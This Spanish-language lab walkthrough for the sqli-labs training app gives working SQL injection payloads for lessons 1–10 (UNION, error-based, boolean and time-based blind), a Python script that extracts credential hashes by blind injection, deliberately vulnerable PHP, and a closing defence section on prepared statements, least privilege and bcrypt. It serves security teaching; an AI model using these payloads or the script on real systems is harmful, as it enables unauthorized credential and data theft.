📖 Concepto Previo: Por Qué Existe Esta Vulnerabilidad

Antes de atacar cualquier lección, necesitas entender la raíz del problema. SQL Injection existe por una sola razón: el código mezcla los datos del usuario con el código SQL en el mismo canal, sin separarlos.

Cuando un desarrollador escribe esto en PHP:

$id  = $_GET['id'];                               // toma lo que el usuario escribió
$sql = "SELECT * FROM users WHERE id='$id'";      // lo pega dentro del SQL
$result = mysqli_query($con, $sql);               // MySQL ejecuta TODO eso

MySQL recibe un string completo. No sabe qué parte escribió el desarrollador y qué parte vino del usuario. Para MySQL, todo es SQL. Si el usuario envía algo que modifica la estructura de esa consulta, MySQL lo ejecuta sin preguntar.

La solución correcta, que verás en la sección de defensa, es esta:

$stmt = mysqli_prepare($con, "SELECT * FROM users WHERE id = ?");
mysqli_stmt_bind_param($stmt, "i", $id);   // el valor va por un canal SEPARADO
mysqli_stmt_execute($stmt);                // MySQL ya compiló la estructura antes

Con esta versión, MySQL compila la estructura de la consulta primero. Luego recibe el valor del usuario como dato puro, nunca como SQL. Una comilla, un UNION, un OR: todo se trata como texto literal. La inyección es imposible.

💡 Regla mental: Cada lección de sqli-labs usa la primera versión (código inseguro). Tu objetivo es demostrar el impacto. La sección de defensa al final muestra cómo aplicar la segunda versión.

🔴 BLOQUE 1 — Inyección Básica y Bypass de Autenticación (Less-1 a Less-4)

Estas cuatro lecciones modelan el caso más común de SQLi: un parámetro de URL que se concatena directamente en la consulta. La diferencia entre ellas es cómo el desarrollador delimitó el valor. Identificar ese delimitador es siempre el primer paso.

Less-1: String con Comilla Simple

Código vulnerable que tiene esta lección:

$id  = $_GET['id'];
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";

El valor de id está rodeado de comillas simples en el SQL. Para salir de ese contexto y escribir SQL propio, primero hay que cerrar esa comilla.

Paso 1 — Confirmar que la página funciona normalmente

http://159.112.137.106/sqli-labs/Less-1/?id=1

Resultado esperado: "Your Login name: Dumb / Your Password: Dumb". La página busca al usuario con id=1 y lo muestra. Todo normal por ahora.

Paso 2 — Romper la consulta para confirmar vulnerabilidad

http://159.112.137.106/sqli-labs/Less-1/?id=1'

Resultado esperado: error de sintaxis MySQL — "You have an error in your SQL syntax...". Agregaste una comilla extra. MySQL recibió WHERE id='1'' — sintaxis inválida. El error confirma dos cosas: la página es vulnerable y el delimitador es comilla simple.

Paso 3 — Tomar control de la consulta con un comentario

http://159.112.137.106/sqli-labs/Less-1/?id=1'-- -

Resultado esperado: vuelve a mostrar "Dumb / Dumb" sin error. El -- - es el símbolo de comentario en MySQL. Todo lo que viene después queda ignorado. MySQL ejecuta WHERE id='1' y el resto desaparece. Tienes control sobre la estructura de la consulta.

💡 ¿Por qué -- - y no solo --? El estándar SQL requiere un espacio después de -- para que sea un comentario. Algunos servidores recortan espacios al final de la URL, así que se agrega el guion extra como carácter ancla para asegurar que el espacio no desaparezca.

Paso 4 — Descubrir cuántas columnas tiene la consulta

Para usar UNION más adelante necesitas saber cuántas columnas selecciona la consulta original. La técnica es ORDER BY: si pides ordenar por una columna que no existe, MySQL da error. 

?id=1' ORDER BY 1-- -   → sin error (columna 1 existe)
?id=1' ORDER BY 2-- -   → sin error (columna 2 existe)
?id=1' ORDER BY 3-- -   → sin error (columna 3 existe)
?id=1' ORDER BY 4-- -   → ERROR: "Unknown column '4' in order clause"

Conclusión: la consulta tiene exactamente 3 columnas.

Paso 5 — Identificar cuáles columnas son visibles en pantalla

Usamos id=999 (un ID que no existe) para que la consulta original retorne vacío. Así solo veremos los datos del UNION, no los originales. 

?id=999' UNION SELECT 1,2,3-- -

Resultado esperado: aparecen los números 2 y 3 en pantalla donde antes decía "Login name" y "Password". Esas posiciones son tus canales de exfiltración. Todo lo que pongas ahí aparecerá en la página.

Paso 6 — Extraer información del sistema

# Nombre de la base de datos activa
?id=999' UNION SELECT 1,database(),3-- -

# Versión de MySQL
?id=999' UNION SELECT 1,version(),3-- -

# Usuario con el que corre la aplicación
?id=999' UNION SELECT 1,user(),3-- -

Resultado esperado: aparece security como nombre de BD.

Paso 7 — Enumerar tablas de la base de datos

information_schema es una base de datos especial de MySQL que contiene el mapa de todas las tablas y columnas. No almacena datos de usuarios; almacena metadatos del sistema. Es el directorio del motor de base de datos. 

?id=999' UNION SELECT 1,GROUP_CONCAT(table_name SEPARATOR ', '),3
FROM information_schema.tables
WHERE table_schema=database()-- -

Resultado esperado: "emails, referers, uagents, users"

Paso 8 — Enumerar columnas de la tabla users

?id=999' UNION SELECT 1,GROUP_CONCAT(column_name SEPARATOR ', '),3
FROM information_schema.columns
WHERE table_name='users'-- -

Resultado esperado: "id, username, password"

Paso 9 — Extraer todas las credenciales — FLAG para el CTFd

?id=999' UNION SELECT 1,GROUP_CONCAT(username,':',password SEPARATOR ' | '),3
FROM users-- -

Resultado esperado: lista completa de usuarios con sus hashes. El hash del usuario admin es tu FLAG para el CTFd.

Less-2: Integer sin Delimitador

Código vulnerable:

$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";

No hay comillas alrededor de $id. El valor va directamente como número. No necesitas cerrar ninguna comilla.

Paso 1 — Confirmar que no hay comilla

?id=1'    → error diferente al de Less-1
?id=1-- - → sin error ✔ confirmado: valor numérico sin delimitador

Paso 2 — Repetir el flujo completo sin comilla inicial

# Encontrar columnas
?id=1 ORDER BY 3-- -   → sin error
?id=1 ORDER BY 4-- -   → ERROR → 3 columnas

# Extraer credenciales
?id=999 UNION SELECT 1,GROUP_CONCAT(username,':',password SEPARATOR ' | '),3
FROM users-- -
💡 Punto clave: El número de columnas y las posiciones visibles son iguales a Less-1 porque el código PHP es el mismo, solo cambia el delimitador. La técnica es idéntica; solo adaptas cómo entras al contexto SQL.

Less-3: String con Comilla Simple y Paréntesis

Código vulnerable:

$sql = "SELECT * FROM users WHERE id=('$id') LIMIT 0,1";

El valor está dentro de comilla simple Y paréntesis: ('valor'). Hay que cerrar los dos.

Paso 1 — Probar el payload de Less-1 y ver que falla

?id=1'-- -   → sigue dando error

El paréntesis quedó sin cerrar. MySQL recibió WHERE id=('1'-- -) — el paréntesis de cierre rompe la sintaxis.

Paso 2 — Cerrar comilla Y paréntesis

?id=1')-- -   → sin error ✔

MySQL recibe: WHERE id=('1') y el resto está comentado.

Paso 3 — Extraer credenciales

?id=999') UNION SELECT 1,GROUP_CONCAT(username,':',password SEPARATOR ' | '),3
FROM users-- -
💡 Método para identificar el delimitador desconocido: Prueba en orden: 1'-- - → 1')-- - → 1")-- - → 1-- -. El primero que no genere error es el delimitador correcto. En producción nunca ves el código fuente; tienes que inferirlo así.

Less-4: String con Comilla Doble y Paréntesis

Código vulnerable:

$sql = "SELECT * FROM users WHERE id=(\"$id\") LIMIT 0,1";

Paso 1 — Identificar el delimitador

?id=1'-- -    → sigue dando error (no es comilla simple)
?id=1")-- -   → sin error ✔ → delimitador: comilla doble con paréntesis

Paso 2 — Extraer credenciales

?id=999") UNION SELECT 1,GROUP_CONCAT(username,':',password SEPARATOR ' | '),3
FROM users-- -

🔴 BLOQUE 2 — Error-Based Injection (Less-5 y Less-6)

Estas lecciones no muestran datos en la respuesta normal — solo muestran "You are in" o nada. UNION-based no funciona porque no hay posición visual donde aparezcan los datos. Pero la aplicación sí muestra errores de MySQL. Los errores se convierten en el canal de exfiltración.

Less-5: Error-Based con extractvalue()

Paso 1 — Confirmar que UNION no funciona aquí

?id=999' UNION SELECT 1,2,3-- -

La página no muestra los números — no hay canal visual para el UNION.

Paso 2 — Entender cómo funciona extractvalue()

extractvalue(xml, xpath) es una función de MySQL para trabajar con XML. Si el XPath es inválido, MySQL genera un error que incluye el resultado de evaluar la expresión. El atacante mete una subconsulta SQL donde va el XPath. MySQL la evalúa, intenta usarla como XPath, falla, y el error expone el resultado de la subconsulta. 

# Internamente ocurre esto:
# 1. MySQL evalúa: SELECT database() → 'security'
# 2. concat(0x7e, 'security') → '~security'  (0x7e es el carácter ~)
# 3. extractvalue(1, '~security') → '~security' no es XPath válido → error
# 4. El error dice: XPATH syntax error: '~security'
# 5. El atacante lee 'security' del mensaje de error

?id=1' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -

Resultado esperado: XPATH syntax error: '~security'

Paso 3 — Extraer información del sistema

# Versión de MySQL — FLAG del CTFd
?id=1' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -

# Usuario de la aplicación
?id=1' AND extractvalue(1,concat(0x7e,(SELECT user())))-- -

Paso 4 — Enumerar tablas

?id=1' AND extractvalue(1,concat(0x7e,
  (SELECT GROUP_CONCAT(table_name)
   FROM information_schema.tables
   WHERE table_schema=database())))-- -

Resultado esperado: XPATH syntax error: '~emails,referers,uagents,users'

Paso 5 — Extraer credenciales

?id=1' AND extractvalue(1,concat(0x7e,
  (SELECT concat(username,0x3a,password)
   FROM users LIMIT 1)))-- -
⚠️ Límite de 32 caracteres: extractvalue() solo muestra los primeros 32 caracteres en el error. Un hash MD5 tiene exactamente 32 caracteres. Si el resultado aparece truncado, usa substring() para paginar: 
?id=1' AND extractvalue(1,concat(0x7e,
  substring((SELECT password FROM users WHERE username='admin' LIMIT 1),1,32)))-- -

Less-6: Error-Based con Comilla Doble

Código vulnerable:

$sql = "SELECT * FROM users WHERE id=\"$id\" LIMIT 0,1";

Paso 1 — Identificar el delimitador

?id=1'-- -   → sigue dando error
?id=1"-- -   → sin error ✔ → delimitador es comilla doble

Paso 2 — Aplicar extractvalue() con el delimitador correcto

?id=1" AND extractvalue(1,concat(0x7e,(SELECT database())))-- -
?id=1" AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
?id=1" AND extractvalue(1,concat(0x7e,
  (SELECT concat(username,0x3a,password) FROM users LIMIT 1)))-- -
💡 Punto pedagógico: La técnica es 100% idéntica a Less-5. Cambió solo el carácter de cierre. Una vez que dominas la mecánica, identificar el delimitador es lo único variable entre lecciones.

🔴 BLOQUE 3 — Blind SQL Injection (Less-8, Less-9, Less-10)

En producción, la mayoría de aplicaciones no muestran errores ni datos SQL. Solo se ve si la operación tuvo éxito o no. Blind injection demuestra que incluso sin ninguna retroalimentación visual directa, se puede extraer cualquier dato de la base de datos.

Less-8: Boolean-Based Blind

Esta lección solo muestra "You are in" cuando la consulta retorna resultados. No muestra datos, no muestra errores. Solo esa frase o nada. Esa diferencia binaria es suficiente para extraer cualquier dato.

Paso 1 — Confirmar la señal binaria

# Condición TRUE: debe mostrar "You are in"
?id=1' AND 1=1-- -

# Condición FALSE: NO debe mostrar nada
?id=1' AND 1=2-- -
No avances hasta confirmar esto. Si ambas URLs muestran lo mismo, la señal booleana no funciona y tendrás que usar time-based (Less-9). La diferencia entre las dos respuestas es el fundamento de todo lo que sigue.

Paso 2 — Hacer preguntas de sí/no sobre los datos

Usamos ASCII(SUBSTRING(dato, posición, 1)) para extraer un carácter y comparar su valor numérico. Con búsqueda binaria dividimos el rango a la mitad en cada intento, identificando cualquier carácter en máximo 7 comparaciones. 

# ¿El primer carácter de database() tiene ASCII mayor a 100?
?id=1' AND ASCII(SUBSTRING(database(),1,1))>100-- -
→ "You are in" = SÍ (el valor está por encima de 100)

# ¿Mayor a 110?
?id=1' AND ASCII(SUBSTRING(database(),1,1))>110-- -
→ "You are in" = SÍ (está entre 110 y 127)

# ¿Mayor a 115?
?id=1' AND ASCII(SUBSTRING(database(),1,1))>115-- -
→ Silencio = NO (está entre 110 y 115)

# ¿Es exactamente 115?
?id=1' AND ASCII(SUBSTRING(database(),1,1))=115-- -
→ "You are in" = SÍ ✔ → ASCII 115 = carácter 's'

El primer carácter de database() es 's'. Repites esto para la posición 2, 3, 4... hasta reconstruir la palabra completa: security.

Paso 3 — Automatizar con script Python

Hacerlo manualmente para un hash MD5 de 32 caracteres requeriría ~224 requests. El siguiente script implementa búsqueda binaria automática para extraer cualquier dato. 

import requests

# ── Configuración ─────────────────────────────────────────────
TARGET_URL     = "http://159.112.137.106/sqli-labs/Less-8/"
TRUE_INDICATOR = "You are in"   # texto que aparece cuando la condición es TRUE

def es_verdadero(payload):
    """Envía el payload y verifica si la respuesta indica TRUE."""
    url       = f"{TARGET_URL}?id=1{payload}"
    respuesta = requests.get(url, timeout=5)
    return TRUE_INDICATOR in respuesta.text

def extraer_string(consulta_sql, longitud_maxima=64):
    """
    Extrae el resultado de una consulta SQL carácter por carácter
    usando búsqueda binaria sobre valores ASCII (32-127).
    """
    resultado = ""

    for posicion in range(1, longitud_maxima + 1):
        limite_inferior = 32    # carácter espacio
        limite_superior = 127   # carácter DEL
        caracter_encontrado = False

        while limite_inferior <= limite_superior:
            punto_medio = (limite_inferior + limite_superior) // 2

            payload = (
                f"' AND ASCII(SUBSTRING(({consulta_sql}),{posicion},1))"
                f">{punto_medio}-- -"
            )

            if es_verdadero(payload):
                limite_inferior = punto_medio + 1
            else:
                payload_exacto = (
                    f"' AND ASCII(SUBSTRING(({consulta_sql}),{posicion},1))"
                    f"={punto_medio}-- -"
                )
                if es_verdadero(payload_exacto):
                    resultado += chr(punto_medio)
                    caracter_encontrado = True
                    break
                else:
                    limite_superior = punto_medio - 1

        if not caracter_encontrado:
            break

    return resultado


# ── Ejecución ─────────────────────────────────────────────────
print("[*] Extrayendo nombre de la base de datos...")
db = extraer_string("SELECT database()")
print(f"[+] Base de datos: {db}")

print("\n[*] Extrayendo tablas...")
tablas = extraer_string(
    f"SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR ',')"
    f" FROM information_schema.tables WHERE table_schema='{db}'"
)
print(f"[+] Tablas: {tablas}")

print("\n[*] Extrayendo columnas de 'users'...")
columnas = extraer_string(
    f"SELECT GROUP_CONCAT(column_name SEPARATOR ',')"
    f" FROM information_schema.columns WHERE table_name='users'"
)
print(f"[+] Columnas: {columnas}")

print("\n[*] Extrayendo hash del administrador...")
hash_admin = extraer_string(
    "SELECT password FROM users WHERE username='admin' LIMIT 1"
)
print(f"[+] Hash admin: {hash_admin}")

Less-9: Time-Based Blind

Esta lección siempre muestra "You are in" independientemente de si la condición es verdadera o falsa. No hay señal visual. El único canal disponible es el tiempo de respuesta.

Paso 1 — Confirmar que la señal booleana NO funciona

?id=1' AND 1=1-- -   → "You are in"
?id=1' AND 1=2-- -   → "You are in" también

Ambas respuestas son idénticas. Boolean-based no funciona aquí.

Paso 2 — Confirmar que time-based funciona

SLEEP(N) hace que MySQL espere N segundos antes de retornar. Si la respuesta tarda ~3 segundos, la inyección funciona y el tiempo es el canal. 

?id=1' AND SLEEP(3)-- -

Resultado esperado: la respuesta tarda aproximadamente 3 segundos.

Paso 3 — Hacer preguntas con tiempo como canal

# Si TRUE → espera 3 segundos. Si FALSE → responde inmediatamente.
?id=1' AND IF(ASCII(SUBSTRING(database(),1,1))>100,SLEEP(3),0)-- -

La lógica de extracción es idéntica a Less-8. Solo cambia el canal: tiempo en lugar de texto visible.

💡 Por qué time-based es menos confiable: La latencia de red puede generar falsos positivos. En red local (como este laboratorio) la latencia es despreciable y el método es confiable. En entornos reales con alta latencia se usan sleeps de 5+ segundos y múltiples confirmaciones por bit.

Less-10: Time-Based con Comilla Doble

Mismo mecanismo que Less-9. Solo cambia el delimitador.

# Confirmar delimitador
?id=1"-- -   → sin error ✔

# Confirmar time-based
?id=1" AND SLEEP(3)-- -

# Extracción
?id=1" AND IF(ASCII(SUBSTRING(database(),1,1))>100,SLEEP(3),0)-- -

🔵 Blue Team: Defensa Contra SQL Injection

Capa 1 — Prevención: Prepared Statements

La raíz del problema es que el código mezcla dos cosas en el mismo canal: la estructura de la consulta SQL y el valor que proviene del usuario. MySQL no puede distinguir una de la otra, así que ejecuta todo como si fuera código legítimo. Los Prepared Statements resuelven esto separando esos dos canales.

Canal 1 — La estructura va primero: La aplicación envía la consulta con un signo de pregunta como marcador de posición, sin ningún valor todavía. MySQL recibe esa estructura, la parsea, la valida y la compila a bytecode. En este punto la consulta ya está fija y no puede ser modificada por nada que llegue después.

Canal 2 — El valor llega por separado y nunca pasa por el parser: MySQL inserta el valor directamente en el bytecode ya compilado. Si el usuario envía un payload de inyección, MySQL lo trata como texto literal, no como SQL. No hay comillas que cerrar, no hay instrucciones que inyectar.

Así se ve en código, línea por línea:

# CÓDIGO INSEGURO — estructura y datos en el mismo canal
$id  = $_GET['id'];
$sql = "SELECT * FROM users WHERE id='$id'";
#                                    ^^^^
# Si el usuario envía:  1' OR '1'='1
# MySQL recibe:         WHERE id='1' OR '1'='1'
# Resultado:            retorna TODOS los usuarios — bypass total
$r = mysqli_query($con, $sql);
# CÓDIGO SEGURO — dos canales completamente separados
$id = $_GET['id'];

# Canal 1: solo la estructura de la consulta
# El signo ? es el marcador de posición — no hay valor aquí todavía
# MySQL compila esta estructura a bytecode. Ya no puede ser modificada.
$stmt = mysqli_prepare($con, "SELECT * FROM users WHERE id = ?");

# Canal 2: el valor del usuario, declarando su tipo
# "i" = integer — si el usuario envía texto malicioso, MySQL lo trata como número
# El parser nunca ve este valor. La inyección es imposible.
mysqli_stmt_bind_param($stmt, "i", $id);

# MySQL ejecuta el bytecode compilado con el valor sustituido de forma segura
mysqli_stmt_execute($stmt);
💡 Los tipos en bind_param: El segundo argumento declara el tipo de cada parámetro que se va a sustituir. MySQL usa esa declaración para tratar el valor antes de insertarlo en la consulta.

"i" = integer — convierte el input a número. Un payload como 1' OR '1'='1 se convierte en 1.
"s" = string — escapa el input automáticamente. Una comilla dentro del valor se trata como carácter, no como delimitador SQL.
"d" = double — para números decimales.
"b" = blob — para datos binarios.
💡 Ejemplo con username (tipo string): El caso más frecuente en formularios de login. Si el usuario envía admin'-- - como username, MySQL lo almacena como el string literal admin'-- - — la comilla y los guiones son caracteres de texto, no SQL. La búsqueda simplemente no encuentra ningún usuario con ese nombre exacto. 
$user = $_POST['username'];
$stmt = mysqli_prepare($con, "SELECT * FROM users WHERE username = ?");
mysqli_stmt_bind_param($stmt, "s", $user);  // "s" = string
mysqli_stmt_execute($stmt);

Capa 2 — Mitigación: Mínimo Privilegio en MySQL

Si la inyección ocurre con un usuario de base de datos con privilegios limitados, el atacante no puede enumerar information_schema, escribir archivos ni acceder a otras bases de datos. 

-- Crear usuario de aplicación con solo lo necesario
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password_fuerte';
GRANT SELECT, INSERT, UPDATE, DELETE ON security.users TO 'app_user'@'localhost';
-- Sin FILE, sin EXECUTE, sin GRANT OPTION
FLUSH PRIVILEGES;

Capa 3 — Mitigación Post-Compromiso: Hashing con Salt

En sqli-labs los hashes son MD5 sin salt y se crackean en milisegundos. En producción los passwords deben usar bcrypt o Argon2. Un hash bcrypt extraído via SQLi es computacionalmente inviable de revertir. 

# PHP — almacenar password con bcrypt
$hash = password_hash($password, PASSWORD_BCRYPT);

# PHP — verificar password
if (password_verify($input, $hash)) {
    // acceso concedido
}
💡 TDE no protege contra SQLi activa: Transparent Data Encryption cifra los archivos físicos en disco pero no detiene una inyección en curso: la consulta llega al motor con credenciales válidas y retorna datos descifrados automáticamente. La protección real es el hashing con salt.

💡 Lecciones Aprendidas

  • La vulnerabilidad está en el código, no en la base de datos: MySQL hace exactamente lo que le piden. El problema es que la aplicación le pasa instrucciones del usuario sin separarlas del código.
  • El delimitador siempre es lo primero que hay que identificar: Sin saber cómo cerrar el contexto actual, no se puede inyectar SQL válido. La prueba ordenada funciona en cualquier aplicación.
  • La ausencia de retroalimentación visual no protege: Less-8 demuestra que una página que solo dice "sí" o "no" puede ser explotada igual que una que muestra todos los datos.
  • TDE no protege contra SQLi activa: Cifra archivos físicos, no consultas en ejecución. La protección real post-compromiso es el hashing con salt (bcrypt/Argon2).
  • SQLMap es automatización, no comprensión: Usarlo sin haber completado los pasos manuales produce resultados sin entendimiento.
  • Prepared Statements son la única solución real: WAFs y listas negras pueden bypassearse. Separar el canal de la estructura del canal de los datos resuelve el problema de raíz.
